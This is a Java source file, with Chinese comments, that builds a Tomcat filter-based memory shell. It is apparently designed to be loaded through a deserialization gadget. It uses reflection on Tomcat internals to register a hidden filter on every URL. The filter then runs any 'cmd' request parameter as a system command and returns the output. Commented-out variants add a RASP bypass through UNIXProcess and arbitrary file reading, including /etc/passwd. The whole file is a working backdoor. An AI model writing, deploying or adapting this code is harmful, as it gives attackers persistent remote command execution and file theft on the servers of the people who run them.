package org.example.tomcatmemshell.Filter;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.core.*;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Enumeration;

public class FilterMemShell extends AbstractTranslet implements Filter {
    private String message;

    static {
        try {
            //获取StandardContext
//            StandardContext standardContext = getStandardContext1();
            StandardContext standardContext = getStandardContext2();
            if(standardContext != null){
                //自定义StandardWrapper注册进StandardContext
                FilterMemShell filterMemShell = new FilterMemShell();
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filterMemShell);
                filterDef.setFilterName("filterMemShell");
                filterDef.setFilterClass(filterMemShell.getClass().getName());
                standardContext.addFilterDef(filterDef);
                standardContext.filterStart();
                //将恶意filterConfigs放进StandardContext

                FilterMap filterMap = new FilterMap();
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                filterMap.setFilterName("filterMemShell");
                filterMap.addURLPattern("/*");
                standardContext.addFilterMapBefore(filterMap);
                //修改参数filterMap

            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }



    public static StandardContext getStandardContext1() {
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();
            return (StandardContext) StandardContext;
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

    public static StandardContext getStandardContext2() {
        try{
            //反射获取WRAP_SOME_OBJECT_FIELD lastServicedRequest lastServicedResponse
            Field WRAP_SOME_OBJECT_FIELD=Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestfield= ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponsefield=ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            WRAP_SOME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestfield.setAccessible(true);
            lastServicedResponsefield.setAccessible(true);
            //使用modifiersField修改属性值的final修饰
            //每一个Field都会存在一个变量 modifiers用来描述修饰词，所以这里我们获取到的是Field的modifiers 它本质上是一个int类型的值
            java.lang.reflect.Field  modifiersfield= Field.class.getDeclaredField("modifiers");
            modifiersfield.setAccessible(true);

            //修改WRAP_SOME_OBJECT_FIELD以及requst和response的modifiers，值的话由于要得到16进制位数，并且清除final属性，本质上就是将他修改为0x0000即可，这里getModifiers()的结果为0x0010 Modifier.FINAL的结果也是0x0010，所以两者&~运算得到0x0000
            modifiersfield.setInt(WRAP_SOME_OBJECT_FIELD,WRAP_SOME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedRequestfield,lastServicedRequestfield.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedResponsefield,lastServicedResponsefield.getModifiers() & ~Modifier.FINAL);


            //如果是第一次访问，WRAP_SOME_OBJECT_FIELD肯定是没有值的，所以我们赋值上true 并且同时给lastServicedRequest和lastServicedResponse都初始化
            if(!WRAP_SOME_OBJECT_FIELD.getBoolean(null)){
                WRAP_SOME_OBJECT_FIELD.setBoolean(null,true);
                lastServicedResponsefield.set(null,new ThreadLocal<ServletResponse>());
                lastServicedRequestfield.set(null,new ThreadLocal<ServletRequest>());
                return null;

            }else{//第二次访问开始正式获取当前线程下的Req和Resp
                ThreadLocal<ServletRequest> threadLocalReq= (ThreadLocal<ServletRequest>)lastServicedRequestfield.get(null);
                ThreadLocal<ServletResponse> threadLocalResp=(ThreadLocal<ServletResponse>) lastServicedResponsefield.get(null);
                ServletRequest servletRequest = threadLocalReq.get();//servletRequest:RequestFacade
                ServletResponse servletResponse = threadLocalResp.get();

                ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletRequest.getServletContext();
                Field applicationContextFacadeField = applicationContextFacade.getClass().getDeclaredField("context");
                applicationContextFacadeField.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeField.get(applicationContextFacade);
                Field standardContextField = applicationContext.getClass().getDeclaredField("context");
                standardContextField.setAccessible(true);
                StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

                System.out.println(servletRequest);
                return standardContext;
            }

        }
        catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        Filter.super.init(filterConfig);
    }


    @Override
    public void destroy() {
        Filter.super.destroy();
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws IOException, ServletException {
        System.out.println(
                "TomcatShellInject doFilter.....................................................................");
        String cmdParamName = "cmd";
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null){
////UNIXProcessImpl 绕过ProcessImpl.start、Runtime.exec RASP，详情搜索JNI
//            Class<?> cls = null;
//            try {
//                cls = Class.forName("java.lang.UNIXProcess");
//            } catch (ClassNotFoundException e) {
//                throw new RuntimeException(e);
//            }
//            Constructor<?> constructor = cls.getDeclaredConstructors()[0];
//            constructor.setAccessible(true);
//            String[] command = {"/bin/sh", "-c", cmd};
//            byte[] prog = toCString(command[0]);
//            byte[] argBlock = getArgBlock(command);
//            int argc = argBlock.length;
//            int[] fds = {-1, -1, -1};
//            Object obj = null;
//            try {
//                obj = constructor.newInstance(prog, argBlock, argc, null, 0, null, fds, false);
//                Method method = cls.getDeclaredMethod("getInputStream");
//                method.setAccessible(true);
//                InputStream is = (InputStream) method.invoke(obj);
//                InputStreamReader isr = new InputStreamReader(is);
//                BufferedReader br = new BufferedReader(isr);
//                StringBuilder stringBuilder = new StringBuilder();
//                String line;
//                while ((line = br.readLine()) != null) {
//                    stringBuilder.append(line + '\n');
//                }
//                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            } catch (InstantiationException | NoSuchMethodException | InvocationTargetException |
//                     IllegalAccessException e) {
//                throw new RuntimeException(e);
//            }
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;

////读文件
//            File file = new File(cmd);
//            // 1. 确保文件存在且可读
//            if (!file.exists() || !file.isFile() || !file.canRead()) {
//                System.out.println("文件不存在或无法读取: " + cmd);
//                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_NOT_FOUND, "文件不存在");
//                return;
//            }
//            // 2. 设置响应头，提供文件下载
//            HttpServletResponse response = (HttpServletResponse) servletResponse;
//            response.setContentType("application/octet-stream");
//            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
//            // 3. 读取文件并写入响应流
//            try (FileInputStream fis = new FileInputStream(file);
//                 OutputStream out = response.getOutputStream()) {
//                byte[] buffer = new byte[4096];
//                int bytesRead;
//                while ((bytesRead = fis.read(buffer)) != -1) {
//                    out.write(buffer, 0, bytesRead);
//                }
//                out.flush();
//            } catch (IOException e) {
//                System.err.println("文件传输失败: " + e.getMessage());
//                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "文件传输失败");
//            }

////读文件 ?cmd=file:///etc/passwd or 列目录 ?cmd=file:///
//            final URL url = new URL(cmd);
//            final BufferedReader in = new BufferedReader(new
//                    InputStreamReader(url.openStream()));
//            StringBuilder stringBuilder = new StringBuilder();
//            String line;
//            while ((line = in.readLine()) != null) {
//                stringBuilder.append(line + '\n');
//            }
//            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;

//RCE ?cmd=whoami
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        chain.doFilter
                (servletRequest, servletResponse);
    }
}
